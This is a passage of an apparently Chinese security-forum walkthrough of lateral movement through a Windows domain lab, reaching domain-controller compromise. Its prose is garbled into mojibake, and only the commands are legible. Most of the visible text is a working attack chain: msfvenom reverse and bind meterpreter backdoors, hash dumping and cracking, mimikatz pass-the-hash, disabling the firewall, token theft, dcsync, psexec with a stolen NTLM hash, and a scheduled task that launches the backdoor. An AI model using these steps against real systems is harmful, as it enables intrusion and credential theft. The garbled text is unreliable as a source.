ï¼çè³åå»ºæ°çè¿ç¨ãæ¥æSeImpersonatePrivilegeç¹æï¼å°±å¯ä»¥è°ç¨CreateProcessWithToken()ï¼æ¥æSeAssignPrimaryTokenPrivilegeç¹æï¼å°±å¯ä»¥è°ç¨CreateProcessAsUser()ãèPrintSpooferå°±æ¯è¿æ
·çä¸æ¬¾å¼æºå·¥å ·ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_VNGFCECZF6SUCPM.png)  
åæ¶æä»¬ä¹å¯ä»¥éè¿net
startæ¥çå½åè®¡ç®æºå¼å¯äºåªäºæå¡ï¼æ
¹æ®æå¡åè¿è¡å¤æ­æ¯å¦å¯¹åç»­æææå¸®å©çã

## [](https://bbs.pediy.com/thread-268289.htm)7.3 å ç½æ¸é

æä»¬ä½¿ç¨msfçæç¸å ³åé¨ï¼å©ç¨PrintSpooferæ§è¡åé¨ï¼  
msfvenom -p windows/meterpreter/reverse_http lhost=192.168.202.180 lport=22222
-f exe -o h4.exe //çæexe  
use exploit/multi/handler //å»ºç«çå¬  
set payload windows/meterpreter/reverse_http  
set lport 22222  
set lhost 192.168.202.180  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_ZEMUNHPACV6PFKM.png)  
å ä¸ºç®æ æºå¨æ¯windows server 2016è·åä¸å°ææå¯ç
ï¼æä»¬ä½¿ç¨msfä¸­èªå¸¦æ¨¡årun
post/windows/gather/smart_hashdumpï¼æhash dumpåºæ¥  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_RZ9GVET3N2T7X6Y.png)  
å½æä»¬æ¿å°hashåï¼å¯ä»¥ä½¿ç¨hashcatè¿è¡hashå¼å¾çç ´ï¼  
hashcat -a 0 -m 1000 hash.txt rockyou.txt --force  
-a 0 çç ´æ¨¡å¼ä¸ºå­å ¸æ¨¡å¼  
-m æ¯æå®åå¸ç±»å  
hash.txt æ¯ ntml  
rockyou.txt æ¯å­å ¸  
ä¹å¯ä»¥ä½¿ç¨Hashä¼ éç»å½RDPè¿ç¨æ¡é¢ï¼  
Sekurlsa::pth /user:Administrator /domain: 192.168.202.183
/ntlm:fac5d668099409cb6fa223a32ea493b6 â/run:mstsc.exe /restrictedadminâ  
åå¯ä»¥ä½¿ç¨hashå»ºç«ipcè¿æ¥ã



æ¥çå½åä¸»æºå­å¨åªäºç½æ®µrun get_local_subnets:  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_THA4QSWCV8GQDFW.png)  
å è¿è¡å ç½ä¸­å¾ä¸»æºåç°ï¼ä½¿ç¨msfèªå¸¦å¾arpï¼run arp_scanner -r
10.10.1.0/24  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_RXA64W6P6KGQMST.png)  
Msfæ·»å è·¯ç±ï¼run autoroute -s 10.10.1.0/24  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_TVHBTMTHFX4T4SU.png)  
å¯¹æåç°çIPè¿è¡ç«¯å£æ«æï¼proxychains nmap -sC -A 10.10.1.130 -p
80,53,1433,49154,6588,3389,135,21,51464,999ï¼å¯è§åªæ80ç«¯å£æ¯å¼æ¾å¾ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_AVD38HKHPUF92DH.png)  
éè¿è®¿é®80ç«¯å£å¾ç¥æ¯éè¾¾oaå°è¯ä½¿ç¨å ¶RCEæ¼æ´ï¼å
ç¨èåçæphpå°é©¬åå©ç¨RCE expèæ¬è¿è¡æ»å»ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_RKWANRRCX9RTR7W.png)  
è¿æ¥å°é©¬ï¼å½åæéä¸ºsystem:  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_R33T3V9TZPRHTS9.png)



å©ç¨Net startãtasklistãnetstat -anoç­ç¸å
³å½ä»¤è¿è¡ä¿¡æ¯æ¶éï¼å¾ç¥windows Firewallæå¼ï¼æ§è¡NetSh
Advfirewall set allprofiles state offå½ä»¤å ³é­é²ç«å¢ã  
æ¥çç¨msfçæbindåé¨ï¼msfvenom -p windows/meterpreter/bind_tcp
lport=13777 -f exe -o hb.exeï¼ç¨antswordæä»¶ä¸ä¼ bind.exeï¼å¹¶æ§è¡ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_F988C99DRJT97MU.png)



Msfæ§è¡ç¸åºå½ä»¤è¿è¡è¿æ¥ï¼  
use exploit/multi/handler  
set payload windows/meterpreter/bind_tcp  
set RHOST 10.10.1.130  
set lport 13777  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_R9RASVX8FYX4BYW.png)  
æ¥çå½åä¸»æºå­å¨åªäºç½æ®µrun get_local_subnets:  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_8TVXF39CYHBT8Q7.png)  
Migrate è¿ç§»è¿ç¨åï¼load kiwiå è½½mimiatzï¼kiwi_cmd
sekurlsa::logonpasswordså°è¯ä½¿ç¨å
¶è·åhashï¼357bec0ee1f524c62ba536fcd3f74472  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_XXJMF4T78PEAU72.png)  
æ§è¡sysinfoï¼å¯è§è¯¥ä¸»æºå­å¨åä¸­ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_8TSH9A28GRMWDB9.png)  
ä½¿ç¨net timeå®ä½åæ§ï¼  
Chcp 65001è®¾ç½®ä¹±ç   
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_6VNDH2KJTJCMRNS.png)  
ä½¿ç¨msfèªå¸¦æ¨¡åå®ä½åæ§run
post/windows/gather/enum_domainï¼å¾å°åæ§ipï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_5KMBRP8X68XTGRB.png)  
ä½¿ç¨msfèªå¸¦æ¨¡åå¤æ­è¯¥ä¸»æºæ¯å¦æåç®¡ç»å½è¿ï¼run
post/windows/gather/enum_logged_on_usersï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_ZX4WMXPJEM9U33T.png)  
è¿æå ¶ä»ç¸å ³msfèªå¸¦å¾æ¶éä¿¡æ¯æ¨¡åï¼run
post/windows/gather/enum_ad_groupsï¼  
run post/windows/gather/enum_domain_tokens



psæ¥çå½åè¿ç¨ä¿¡æ¯ï¼å¯è§å½ååç®¡æ¯å¨çº¿çï¼å¯ä»¥ä½¿ç¨steal_tokenè¿è¡tokençªåï¼éè¦systemæéï¼ï¼çªåå°ATTACK\adminstratorååä½¿ç¨å
¶èº«ä»½æ§è¡dcsync_ntlmè·å¾hashï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_XPNJHFQYZF5C3PK.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_26RJFRH4GP6TY4V.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_PC8S2ZBDFPDDJ7A.png)  
æ·»å è·¯ç±åï¼æä»¬ä½¿ç¨nmapå¯¹åæ§ipè¿è¡æ«æproxychains nmap -sC
-A 10.10.10.165 -p 80,53,445,1433,49154,6588,3389,135,21,51464,999ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_6TNKKP77Q35XN5T.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_TTFM687PCGF4D4Y.png)  
å¼æ¾äº445ç«¯å£ï¼æä»¬å¯ä»¥å©ç¨è·å¾å¾hashï¼357bec0ee1f524c62ba536fcd3f74472è¿è¡pthä¼
éï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_F7CP3HA39ZP5YUG.png)  
å¦ææä»¬ä½¿ç¨msfèªå¸¦ç: use exploit/windows/smb/psexecæ¨¡åï¼å
ä¸ºåæ§ä¸»æºå¼å¯äºé²ç«å¢ï¼ç»ç»ç¨åºè¿åºï¼æä»¥æ
è®ºpayloadæ¯bindæreserveé½å¤±è´¥ï¼  
set rhosts 10.10.10.165  
set smbuser administrator  
set smbpass aad3b435b51404eeaad3b435b51404ee:357bec0ee1f524c62ba536fcd3f74472  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_YGAYAG5C4XK6VBE.png)  
æä»¬å¯ä»¥ä½¿ç¨ç¬¬ä¸æ¹Impacketå·¥å ·å
ä¸­çsmbexecåpsexecè¿è¡pthï¼æ§è¡ä¸é¢å½ä»¤ï¼  
PsExec -hashes :357bec0ee1f524c62ba536fcd3f74472
ATTACK/Administrator@10.10.10.165
"whoami"ï¼è¿æ¥å°åæ§ä¸»æºå½åæ¯systemæé  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_FWU7SNJ4FKKPF29.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_GNT6F76G8ZK5DQ8.png)  
ä½¿ç¨copyå½åæåé¨å¤å¶å°åæ§ä¸­ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_FYZ3MW3RMPM5BHJ.png)  
ä½¿ç¨å¦ä¸å½ä»¤  
Schtasks /create /s 10.10.10.165 /ru "SYSTEM" /tn executefile /sc DAILY /tr
c:/hb.exe /F  
Schtasks /run /s 10.10.10.165 /tn executefile /i  
åå»ºè®¡åä»»å¡ï¼æ§è¡ç¸å ³åé¨ï¼  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_3E5ZV82D39GBQYU.png)  
![](./\[åå\]åç½æ¨ªç§»æå·§åé¶åºå®è·µ-WEBå®å¨-çéªè®ºå-å®å¨ç¤¾åº_å®å¨æè_bbs.pediy.com_files/718877_UARGUTGWE6XMXBJ.png)

# [](https://bbs.pediy.com/thread-268289.htm)åè:

https://www.moonsec.com/  
å ç½å®å ¨æ»é²



  

